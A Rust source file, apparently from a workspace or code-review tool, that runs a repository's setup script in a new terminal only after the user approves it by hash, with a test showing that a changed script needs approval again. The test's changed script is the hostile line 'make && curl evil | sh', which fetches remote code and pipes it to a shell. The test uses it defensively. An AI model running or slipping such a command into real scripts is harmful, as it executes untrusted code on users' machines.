//! A new workspace's `.lgtm/setup`. It's the repo's code, so it runs only once the user lets
//! it, and again without asking until it changes.

use std::path::Path;

use serde::Serialize;
use specta::Type;

use crate::review::RepoCtx;

/// The repo-relative script a new workspace runs in its first terminal.
pub const SETUP: &str = ".lgtm/setup";

/// The command a new workspace's first terminal runs: its setup script, then a login shell.
pub fn setup_command() -> Vec<String> {
    let shell = crate::pty::default_shell();
    let quoted = format!("'{}'", shell.replace('\'', r"'\''"));
    let script = format!(
        "if [ -x {s} ]; then ./{s}; else sh {s}; fi || echo \"lgtm: {s} exited with $?\"; exec {quoted} -l",
        s = SETUP
    );
    vec![shell, "-l".into(), "-c".into(), script]
}

/// Whether a workspace has a setup script, and whether the user let it run.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Type)]
#[serde(rename_all = "camelCase")]
pub enum Setup {
    None,
    Approved,
    Unapproved,
}

/// The hash of the workspace's setup script, if it has one.
fn script_hash(root: &Path) -> Option<String> {
    let bytes = std::fs::read(root.join(SETUP)).ok()?;
    Some(blake3::hash(&bytes).to_hex().to_string())
}

impl RepoCtx {
    pub fn setup_state(&self, root: &Path) -> Setup {
        let Some(hash) = script_hash(root) else {
            return Setup::None;
        };
        match self.store.lock().unwrap().approved_setup() {
            Ok(Some(approved)) if approved == hash => Setup::Approved,
            _ => Setup::Unapproved,
        }
    }

    /// Lets the workspace's setup script run, as it is now.
    pub fn approve_setup(&self, root: &Path) -> anyhow::Result<()> {
        let hash = script_hash(root).ok_or_else(|| anyhow::anyhow!("no {SETUP}"))?;
        Ok(self.store.lock().unwrap().approve_setup(&hash)?)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::review::tests::{repo, write};

    #[test]
    fn a_script_runs_once_approved_and_asks_again_when_it_changes() {
        let (dir, ctx) = repo();
        let root = dir.path();
        assert_eq!(ctx.setup_state(root), Setup::None);
        assert!(ctx.approve_setup(root).is_err());

        std::fs::create_dir(root.join(".lgtm")).unwrap();
        write(root, SETUP, "make\n");
        assert_eq!(ctx.setup_state(root), Setup::Unapproved);
        ctx.approve_setup(root).unwrap();
        assert_eq!(ctx.setup_state(root), Setup::Approved);

        write(root, SETUP, "make && curl evil | sh\n");
        assert_eq!(ctx.setup_state(root), Setup::Unapproved);
        ctx.approve_setup(root).unwrap();
        assert_eq!(ctx.setup_state(root), Setup::Approved);
    }
}
